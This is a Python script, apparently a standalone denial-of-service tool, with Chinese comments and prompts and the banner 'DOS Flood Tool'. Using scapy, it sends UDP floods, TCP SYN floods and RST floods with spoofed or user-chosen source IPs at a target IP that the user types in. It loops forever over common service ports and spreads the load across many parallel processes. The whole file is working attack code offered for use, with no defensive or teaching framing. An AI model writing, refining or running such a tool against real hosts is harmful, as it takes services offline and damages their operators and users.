from multiprocessing import Process
from scapy.all import *
import os
import sys
import random

# 生成随机IP地址
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

# 生成随机端口号
def randInt():
    x = random.randint(1000, 9000)
    return x

def UDP_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        s_port = randInt()
        payload = Raw(load="X" * 1024)  # 设置负载大小为1024字节

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        UDP_Packet = UDP()
        UDP_Packet.sport = s_port
        UDP_Packet.dport = dstPort

        send(IP_Packet / UDP_Packet / payload, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def TCP_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def RST_Flood(dstIP, srcIP, Port, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        IP_Packet = IP()
        IP_Packet.dst = dstIP
        IP_Packet.src = srcIP

        TCP_Packet = TCP()
        TCP_Packet.dport = Port
        TCP_Packet.flags = "R"

        # 发送ACK数据包
        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def info():
    os.system("clear")
    print("#############################")
    print("# Welcome to DOS Flood Tool #")
    print("#############################")

    dstIP = input("\nTarget IP : ")
    normalPort = [80, 443, 25, 21, 22, 23]

    return dstIP, normalPort
  
def info1():
    os.system("clear")
    print("#############################")
    print("# Welcome to DOS Flood Tool #")
    print("#############################")

    dstIP = input("\nTarget IP : ")
    # dstPort = input("Target Port : ")
    dstPort = [80, 53, 25, 110]
    srcIP = input("\nsourse IP : ")
    return dstIP, srcIP, dstPort

def udp_flood_attack(dstIP, normalPort, counter):
    j = 0
    while True:
        if j == len(normalPort):
            j = 0
        dstPort = normalPort[j]
        UDP_Flood(dstIP, dstPort, int(counter))
        j += 1

def tcp_flood_attack(dstIP, normalPort, counter):
    j = 0
    while True:
        if j == len(normalPort):
            j = 0
        dstPort = normalPort[j]
        TCP_Flood(dstIP, dstPort, int(counter))
        j += 1

def rst_flood_attack(dstIP, srcIP, dstPort, counter):
    j = 0
    while True:
        if j == len(dstPort):
            j = 0
        Port = dstPort[j]
        RST_Flood(dstIP, srcIP, Port, int(counter))
        j += 1

if __name__ == '__main__':
    attack_type = input("请选择攻击方式：\n1. UDP Flood\n2. TCP Flood\n3. RST Flood\n")
    num = input("并行数:")
    counter = input("你需要发送多少包 : ")
    process_list = []

    if attack_type == '1':
        dstIP, normalPort = info()
        for i in range(int(num)):
            p = Process(target=udp_flood_attack, args=(dstIP, normalPort, counter))
            process_list.append(p)
    elif attack_type == '2':
        dstIP, normalPort = info()
        for i in range(int(num)):
            p = Process(target=tcp_flood_attack, args=(dstIP, normalPort, counter))
            process_list.append(p)
    elif attack_type == '3':
        dstIP, srcIP, dstPort = info1()
        for i in range(int(num)):
            p = Process(target=rst_flood_attack, args=(dstIP, srcIP, dstPort, counter))
            process_list.append(p)
    else:
        print("无效的攻击方式选择！")
        sys.exit()

    for p in process_list:
        p.start()
    for p in process_list:
        p.join()
